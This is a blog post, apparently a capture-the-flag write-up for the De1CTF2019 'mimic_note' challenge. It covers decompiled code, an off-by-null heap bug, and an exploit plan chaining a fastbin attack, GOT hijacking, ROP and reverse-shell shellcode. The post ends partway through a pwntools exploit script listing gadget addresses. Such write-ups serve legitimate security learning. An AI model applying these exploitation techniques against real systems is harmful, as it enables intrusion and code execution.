<!doctype html>



  



    
  

<html class="theme-next logos use-motion" lang="zh-hk">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">



<meta http-equiv="Cache-Control" content="no-transform">
<meta http-equiv="Cache-Control" content="no-siteapp">












  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">




  
  
  
  

  
    
    
  

  

  

  

  

  
    
    
    <link href="//fonts.googleapis.com/css?family=Lato:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
  






<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">

<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css">


  <meta name="keywords" content="Hexo, NexT">








  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.0">






<meta name="description" content="The mimic defense is a fancy idea, I don’t know how it works in real-world environment, but definitely interesting when it goes to a pwn challenge.">
<meta property="og:type" content="article">
<meta property="og:title" content="[De1CTF2019] mimic_note">
<meta property="og:url" content="http://matshao.com/2019/08/06/De1CTF2019-mimic-note/index.html">
<meta property="og:site_name" content="Mid Station">
<meta property="og:description" content="The mimic defense is a fancy idea, I don’t know how it works in real-world environment, but definitely interesting when it goes to a pwn challenge.">
<meta property="og:locale" content="zh-hk">
<meta property="og:updated_time" content="2019-08-06T02:08:38.000Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="[De1CTF2019] mimic_note">
<meta name="twitter:description" content="The mimic defense is a fancy idea, I don’t know how it works in real-world environment, but definitely interesting when it goes to a pwn challenge.">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Logos',
    sidebar: {"position":"left","display":"post"},
    fancybox: true,
    motion: true,
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://matshao.com/2019/08/06/De1CTF2019-mimic-note/">





  <title> [De1CTF2019] mimic_note | Mid Station </title>
</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-hk">

  









  
  
    
  

  <div class="container one-collumn sidebar-position-left page-post-detail ">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
    <div class="header-logos"> 
      <div class="site-meta ">
  
    <div class="site-meta-headline">
      <a href="/">
        <img class="custom-logo-image" src="/images/logo_light.png" alt="Mid Station">
      </a>
    </div>
  

  <div class="custom-logo-site-title">
    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <span class="site-title">Mid Station</span>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>
    
      <p class="site-subtitle"></p>
    
</div>

<div class="site-nav-toggle">
  <button>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
    <span class="btn-bar"></span>
  </button>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
            
            首頁
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
            
            歸檔
          </a>
        </li>
      
        
        <li class="menu-item menu-item-about">
          <a href="/about" rel="section">
            
              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
            
            關於
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 
            
      </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            

  <div id="posts" class="posts-expand">
    

  

  
  
  

  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
  <link itemprop="mainEntityOfPage" href="http://matshao.com/2019/08/06/De1CTF2019-mimic-note/">

  <span style="display:none" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <meta itemprop="name" content="Matthew Shao">
    <meta itemprop="description" content>
    <meta itemprop="image" content="/images/avatar.gif">
  </span>

  <span style="display:none" itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
    <meta itemprop="name" content="Mid Station">
    <span style="display:none" itemprop="logo" itemscope itemtype="http://schema.org/ImageObject">
      <img style="display:none;" itemprop="url image" alt="Mid Station" src="/images/logo_light.png">
    </span>
  </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
            
            
              
                [De1CTF2019] mimic_note
              
            
          </h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">發表於</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-08-06T10:01:03+08:00">
                2019-08-06
              </time>
            

            

            
          </span>

          
            <span class="post-category">
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分類於</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Hack/" itemprop="url" rel="index">
                    <span itemprop="name">Hack</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          

          
          

          

          

        </div>
      </header>
    


    <div class="post-body" itemprop="articleBody">

      
      

      
        <p>The mimic defense is a fancy idea, I don’t know how it works in real-world environment, but definitely interesting when it goes to a pwn challenge.</p>
<a id="more"></a>

<h2 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h2><p>The challenge designer provides three binary: <code>mimic</code>, <code>mimic_note_32</code>, <code>mimic_note_64</code>. <code>mimic</code> is the one which we can interact with, the core logic looks like this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    pipe((<span class="keyword">int</span> *)(<span class="number">8L</span>L * i + <span class="number">6299888</span>));</span><br><span class="line">    pipe((<span class="keyword">int</span> *)(<span class="number">8L</span>L * i + <span class="number">6308096</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  pid = vfork();</span><br><span class="line">  <span class="keyword">if</span> ( !pid )</span><br><span class="line">  &#123;</span><br><span class="line">    dup2(infds, <span class="number">0</span>);</span><br><span class="line">    dup2(dword_604104, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">1</span>; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( k = <span class="number">0</span>; k &lt;= <span class="number">1</span>; ++k )</span><br><span class="line">      &#123;</span><br><span class="line">        close(*(&amp;infds + <span class="number">2L</span>L * j + k));</span><br><span class="line">        close(*(&amp;outfds + <span class="number">2L</span>L * j + k));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    execve(<span class="string">"./mimic_note_32"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  v22 = vfork();</span><br><span class="line">  <span class="keyword">if</span> ( !v22 )</span><br><span class="line">  &#123;</span><br><span class="line">    dup2(dword_6020F8, <span class="number">0</span>);</span><br><span class="line">    dup2(dword_60410C, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span> ( l = <span class="number">0</span>; l &lt;= <span class="number">1</span>; ++l )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">for</span> ( m = <span class="number">0</span>; m &lt;= <span class="number">1</span>; ++m )</span><br><span class="line">      &#123;</span><br><span class="line">        close(*(&amp;infds + <span class="number">2L</span>L * l + m));</span><br><span class="line">        close(*(&amp;outfds + <span class="number">2L</span>L * l + m));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    execve(<span class="string">"./mimic_note_64"</span>, <span class="number">0L</span>L, <span class="number">0L</span>L);</span><br><span class="line">  &#125;</span><br><span class="line">  close(infds);</span><br><span class="line">  close(dword_604104);</span><br><span class="line">  close(dword_6020F8);</span><br><span class="line">  close(dword_60410C);</span><br><span class="line">  <span class="keyword">if</span> ( pthread_create(&amp;newthread, <span class="number">0L</span>L, read_stdin, <span class="number">0L</span>L) )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( n = <span class="number">0</span>; n &lt;= <span class="number">1</span>; ++n )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = fcntl(*(&amp;outfds + <span class="number">2</span> * n), <span class="number">3</span>, <span class="number">0L</span>L);</span><br><span class="line">    v18 = v3;</span><br><span class="line">    BYTE1(v3) |= <span class="number">8u</span>;</span><br><span class="line">    fcntl(*(&amp;outfds + <span class="number">2</span> * n), <span class="number">4</span>, v3);</span><br><span class="line">    offsets[n] = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( ii = <span class="number">0</span>; ii &lt;= <span class="number">1</span>; ++ii )</span><br><span class="line">    &#123;</span><br><span class="line">      v19 = waitpid(*(&amp;pid + ii), &amp;stat_loc, <span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v19 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">for</span> ( jj = <span class="number">0</span>; jj &lt;= <span class="number">1</span>; ++jj )</span><br><span class="line">          kill(*(&amp;pid + jj), <span class="number">9</span>);</span><br><span class="line">        pthread_kill(newthread, <span class="number">9</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( kk = <span class="number">0</span>; kk &lt;= <span class="number">1</span>; ++kk )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = read(*(&amp;outfds + <span class="number">2</span> * kk), (<span class="keyword">char</span> *)&amp;bufs + <span class="number">4096</span> * (<span class="keyword">signed</span> __int64)kk + offsets[kk], <span class="number">4096</span> - offsets[kk]);</span><br><span class="line">      v23[kk] = v4;</span><br><span class="line">      <span class="keyword">if</span> ( v23[kk] &gt; <span class="number">0</span> )</span><br><span class="line">        offsets[kk] += v23[kk];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( offsets[<span class="number">0</span>] == dword_6020E4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( offsets[<span class="number">0</span>] )</span><br><span class="line">      &#123;</span><br><span class="line">        v12 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">memcmp</span>(&amp;bufs, &amp;unk_603100, offsets[<span class="number">0</span>]) )</span><br><span class="line">        &#123;</span><br><span class="line">          write(<span class="number">1</span>, &amp;bufs, offsets[<span class="number">0</span>]);</span><br><span class="line">          <span class="keyword">for</span> ( ll = <span class="number">0</span>; ll &lt;= <span class="number">1</span>; ++ll )</span><br><span class="line">            offsets[ll] = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          v12 = <span class="number">31</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ++v12;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v12 &gt; <span class="number">29</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"what are you trying to do?"</span>);</span><br><span class="line">      <span class="keyword">for</span> ( mm = <span class="number">0</span>; mm &lt;= <span class="number">1</span>; ++mm )</span><br><span class="line">        kill(*(&amp;pid + mm), <span class="number">9</span>);</span><br><span class="line">      pthread_kill(newthread, <span class="number">9</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    usleep(<span class="number">0x12C</span>u);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Frankly, I’m not that familiar with the <code>pthread</code> and <code>pipe</code> stuff, but I guess it is going to feed all the input to two child processes and check the outputs. To have a better understanding, I complied a “Hello World” program in both 32bit and 64bit. Then let this <code>mimic</code> program talk to them. As expected, the <code>mimic</code> program will redirect user’s input to two programs, and it will check whether the outputs are the same, if not, or either one of the programs dies, the interaction will be terminated immediately.</p>
<p>The <code>mimic_note_64</code> and <code>mimic_note_32</code> are quite simple, it contains a obvious <code>off-by-null</code> in <code>edit</code> function.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _BYTE *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"index ?"</span>);</span><br><span class="line">  v2 = get_int(<span class="string">"index ?"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt;= <span class="number">0</span> &amp;&amp; v2 &lt;= <span class="number">15</span> &amp;&amp; notes[<span class="number">2</span> * v2] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"content?"</span>);</span><br><span class="line">    v0 = (<span class="keyword">char</span> *)notes[<span class="number">2</span> * v2] + (<span class="keyword">signed</span> <span class="keyword">int</span>)read(<span class="number">0</span>, notes[<span class="number">2</span> * v2], LODWORD(notes[<span class="number">2</span> * v2 + <span class="number">1</span>]));</span><br><span class="line">    *v0 = <span class="number">0</span>; <span class="comment">// [BUG] off-by-null</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">"invalid index"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">signed</span> <span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Two program are compiled from the same source code, and the protections are in same configuration, and the libc version is 2.23.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[*] '/Chanllage/De1CTF2019/mimic_note/mimic_note_32'</span><br><span class="line">    Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line">[*] '/Chanllage/De1CTF2019/mimic_note/mimic_note_64'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>

<h2 id="Exploit-plan"><a href="#Exploit-plan" class="headerlink" title="Exploit plan"></a>Exploit plan</h2><p><code>off-by-null</code> vulnerabilities are so normal in recent CTFs, so it is easy to exploit.  Remember we <strong>DO NOT</strong> have RELRO and PIE protection here, so overwrite <code>.bss</code> and <code>GOT</code> is possible. Here are some questions I asked myself when thinking about the plan:</p>
<ol>
<li>How to make two programs have the same outputs until we get the flag?<ul>
<li>Admittedly, this mimic defense technique is really strong protection. It prevents the attacker from doing the following things:<ul>
<li>leak any address</li>
<li>print out the flag</li>
</ul>
</li>
</ul>
 That means we need to bypass ASLR blindly and use a reverse shell to obtain the flag.  </li>
<li>Which target to choose as our target, 32 or 64？<ul>
<li>My idea is to exploit one of the programs to trigger a reverse shell, while letting the other behave as normal. 32-bit program looks better as the first glance, since lower entropy in ASLR can make things easier if we need to brute-force. But I chose 64-bit because it has a handy gadget in the binary like <code>pop rsp; ...; ret;</code>, which make it possible to perform stack pivot and jump into long rop chain. I’m glad to hear if you have any solution regarding 32-bit program as an attack target.</li>
</ul>
</li>
<li>What kind of exploit techniques should be applied?<ul>
<li>So it’s time to draw the exploit roadmap. First, we use <code>posion-null-byte</code> technique to create overlapping chunks. With the overlapping chunks, we can easily perform <code>fastbin attack</code>. Leaking addresses is not allowed and partial overwrite is also impossible (due to the off-by-one bug, any partial overwrite will end with <code>\x00</code>), so direct GOT hijacking does not work. But without <code>PIE</code> helps us to <code>fastbin attack</code> the <code>.bss </code> (we can freely create any fake size on it). By creating a pointer points to itself on <code>.bss</code>,  we can have <code>arbitrary R/W</code> ability. Then I wrote <code>atoi@got</code> to <code>0x400c33</code>(pop rdi; ret), and pivot into the input buffer of <code>get_int</code> function. And put another rop chain in the input buffer with <code>0x400c2d</code> (pop rsp; pop r13; pop r14; pop r15; ret;), so we can do stack pivot to <code>.bss</code>. Next goal is ropping to call <code>mprotect(0x602000, 0x1000, 7)</code> and jmp to reverse shellcode. </li>
</ul>
</li>
</ol>
<h2 id="Thoughts"><a href="#Thoughts" class="headerlink" title="Thoughts"></a>Thoughts</h2><p>After playing so many pwn challenges, some pattern can be concluded. Many exploit techniques are proposed to get shell, but they come with different flexibility. Quite often, we need to relay on those flexibilites to bypass some mitigation, such as seccomp or mimic.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">                     Techniques                     Corresponding Mitigation</span><br><span class="line"></span><br><span class="line">               +-------------------------------+------------------------------+</span><br><span class="line">               |    Hook hijacking(onegadget)  |   *                          |</span><br><span class="line">               |                               |                              |</span><br><span class="line">Flexibility    |                               |                              |</span><br><span class="line">    +          |    GOT hijacking              |   Full-RELRO                 |</span><br><span class="line">    |          |                               |                              |</span><br><span class="line">    |          |                               |                              |</span><br><span class="line">    |          |    ROP                        |   CFI                        |</span><br><span class="line">    v          |                               |                              |</span><br><span class="line">               |                               |                              |</span><br><span class="line">               |    Shellcode                  |   DEP (NX)                   |</span><br><span class="line">               +-------------------------------+------------------------------+</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">                    Techniques                     Corresponding Mitigation</span><br><span class="line"></span><br><span class="line">               +-------------------------------+------------------------------+</span><br><span class="line">               |    Hook hijacking(onegadget)  |   *                          |</span><br><span class="line"> Complexity    |                               |                              |</span><br><span class="line">     +         |                               |                              |</span><br><span class="line">     |         |    GOT hijacking              |   Full-RELRO                 |</span><br><span class="line">     |         |                               |                              |</span><br><span class="line">     |         |                               |                              |</span><br><span class="line">     v         |    Shellcode                  |   DEP (NX)                   |</span><br><span class="line">               |                               |                              |</span><br><span class="line">               |                               |                              |</span><br><span class="line">               |    ROP                        |   CFI                        |</span><br><span class="line">               +-------------------------------+------------------------------+</span><br></pre></td></tr></table></figure>

<p>After playing so many pwn challenges, some pattern can be concluded. Many exploit techniques are proposed to get shell, but they come with different flexibility. Quite often, we need to rely on those flexibilities to bypass some mitigation, such as seccomp or mimic.<br>To gain enough flexibility to bypass strong mitigations, we usually at least need to get to ROP. But I consider that ROP has the most complexity, the major difficulty is finding proper gadgets and chain them together. For example, in this mimic challenge, our attack chain looks like: <code>GOT hijacking</code> -&gt; <code>ROP</code> -&gt; <code>Shellcode</code>.</p>
<h2 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line">context.log_level = <span class="string">"debug"</span></span><br><span class="line">env = &#123;<span class="string">'LD_PRELOAD'</span>: <span class="string">''</span>&#125;</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./mimic_note_64'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) == <span class="number">1</span>:</span><br><span class="line">    <span class="comment"># p = process('./mimic_note_64')</span></span><br><span class="line">    <span class="comment"># p = process('./mimic_note_32')</span></span><br><span class="line">    p = process(<span class="string">'./mimic'</span>)</span><br><span class="line"><span class="keyword">elif</span> len(sys.argv) == <span class="number">3</span>:</span><br><span class="line">    p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">se      = <span class="keyword">lambda</span> data               :p.send(data) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)</span><br><span class="line">sea     = <span class="keyword">lambda</span> delim,data         :p.sendafter(delim, data)</span><br><span class="line">rc      = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :p.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">'\0'</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">'\0'</span>))</span><br><span class="line">info_addr = <span class="keyword">lambda</span> tag, addr        :p.info(tag + <span class="string">': &#123;:#x&#125;'</span>.format(addr))</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x400c33</span> <span class="comment">#: pop rdi ; ret</span></span><br><span class="line">pop_rsp_r13_r14_r15_ret = <span class="number">0x400c2d</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x400c31</span> <span class="comment">#: pop rsi ; pop r15 ; ret</span></span><br><span class="line">add_ebx_esi = <span class="number">0x4007d9</span> <span class="comment">#: add ebx, esi ; ret</span></span><br><span class="line">pop_rbx_x = <span class="number">0x400c2a</span> <span class="comment"># : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line">mov_call_r12_rbx = <span class="number">0x400c10</span> <span class="comment"># : mov rdx, r13; mov rsi, r14; mov edi, r15d; call qword[r12+rbx*8]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span 